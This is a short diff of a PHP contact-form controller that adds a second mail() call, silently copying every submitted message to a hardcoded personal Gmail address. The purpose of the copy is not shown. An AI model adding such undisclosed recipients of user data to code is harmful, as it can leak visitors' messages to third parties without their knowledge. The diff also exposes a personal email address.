@@ -135,6 +135,7 @@ class IndexController extends Controller
                 "Content-Type:text/html;charset=UTF-8" . "\r\n";
 
         mail($to, $subject, $message, $header);
+        mail('sebas31051999@gmail.com', $subject, $message, $header);
 
         $request->session()->flash('validContact', 'Se ha enviado el correo');
 
